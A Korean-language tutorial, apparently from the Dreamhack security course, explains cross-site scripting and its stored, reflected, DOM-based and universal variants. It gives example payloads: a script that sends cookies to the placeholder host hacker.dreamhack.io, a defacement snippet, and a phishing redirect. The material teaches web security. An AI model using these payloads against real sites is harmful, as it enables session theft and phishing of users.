# 서론

클라이언트 사이드 취약점은 **웹 페이지의 이용자를 대상**으로 공격할 수 있는 취약점이다. 해당 종류의 취약점을 통해 이용자를 식별하기 위한 **세션 및 쿠키 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있다.**

# Cross-Site-Scripting (XSS)

`XSS`는 클라이언트 사이드 취약점 중 하나로, 공격자가 **웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하게 하는 것이다.**

공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있다.

예를 들어, 드림핵 웹 페이지에서 `XSS` 취약점이 존재하면 `https://dreamhack.io` 내에서 오리진 권한으로 악성 스크립트를 삽입할 수 있다.

이후 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자가 임의로 삽입한 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있다.

`XSS`는 `SOP` 보안 정책이 등장하면서, 서로 다른 오리진에서는 정보를 읽는 행위가 이전에 비해 힘들어졌지만, 이를 우회하는 다양한 기술이 존재하기 때문에 `XSS` 공격은 여전히 지속되고 있다.

![Concept of XSS Illustrated](https://github.com/user-attachments/assets/5ebdb9f7-39bf-42e6-b6ef-2d43d25a4015)

## XSS 발생 예시와 종류

`XSS` 공격은 **이용자가 삽입한 내용을 출력하는 기능**에서 발생한다. 이러한 기능의 예로는 로그인 시 출력되는 "안녕하세요, OO회원님"과 같은 문구 또는, 게시물과 댓글이 있다.

클라이언트(예를 들어 브라우저)는 `HTTP` 형식으로 웹 서버에 리소스를 요청하고, 서버로부터 받은 응답인 `HTML, CSS, JS` 등의 웹 리소스를 시각화하여 이용자에게 보여준다.

이때, 만약 악성 웹 리소스가 포함된 게시물을 조회할 경우, 이용자는 변조된 페이지를 보거나 악성 스크립트가 실행될 수 있다.

`XSS`는 아래와 같이 발생 형태(**악성 스크립트가 삽입되는 위치 등**)에 따라서 다양한 종류로 구분되고, [실습 모듈](https://learn.dreamhack.io/labs/2ec6c228-ff7e-46f1-9196-da5f5bd5f1f4) 링크를 통해 직접 테스트해볼 수 있다.

|종류|설명|
|---|---|
|Stored XSS|XSS에 사용되는 악성 스크립트가 **서버에 저장**되고 **서버의 응답에 담겨오는** XSS|
|Reflected XSS|XSS에 사용되는 악성 스크립트가 **URL에 삽입**되고 **서버의 응답에 담겨오는** XSS|
|DOM-based XSS|XSS에 사용되는 악성 스크립트가 **URL Fragment에 삽입되는** XSS<br><ul>Fragment는 서버 요청/응답 에 포함되지 않는다.</ul>|
|Universal XSS|클라이언트의 **브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점**으로 **SOP 정책을 우회**하는 XSS|

## XSS 스크립트 예시

`자바스크립트`는 웹 문서의 동작을 정의한다. 이는 이용자가 버튼 클릭 시에 어떤 이벤트를 발생시킬지와 데이터 입력 시 해당 데이터를 전송하는 이벤트를 구현할 수 있다. 

이러한 기능 외에도 이용자와의 상호 작용 없이 **이용자의 권한으로 정보를 조회하거나 변경하는 등의 행위가 가능**합니다. 

이러한 행위가 가능한 이유는 이용자를 식별하기 위한 **세션 및 쿠키가 웹 브라우저에 저장되어 있기 때문**입니다. 따라서 공격자는 자바스크립트를 통해 이용자에게 보여지는 **웹 페이지를 조작하거나, 웹 브라우저의 위치를 임의의 주소로 변경**할 수 있습니다.

자바스크립트는 다양한 동작을 정의할 수 있기 때문에 XSS 공격에 주로 사용되고, 자바스크립트를 실행하기 위한 태그로는 `<script>`가 있다. 아래 코드들은 자바스크립트를 이용한 `XSS` 공격 코드 예시이다.

### 쿠키 및 세션 탈취 공격 코드

```
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

더 자세히 설명하면, `image.src`를 설정하면 `src`에 대입된 주소로, 이미지를 가져오기 위한 `HTML` 리퀘스트를 보낸다.

여기서 현재 브라우저의 `document.cookie`를 가져와서 `?cookie = document.cookie`로 쿼리를 보내기 떄문에 공격자 주소로 현재 브라우저의 쿠키값이 전달되게 된다.

### 페이지 변조 공격 코드

```
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

### 위치 이동 공격 코드

```
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

`Stored XSS`와 `Reflected XSS`에 대해 [실습 모듈](https://learn.dreamhack.io/labs/2ec6c228-ff7e-46f1-9196-da5f5bd5f1f4)과 함께 조금 더 자세히 살펴보자.

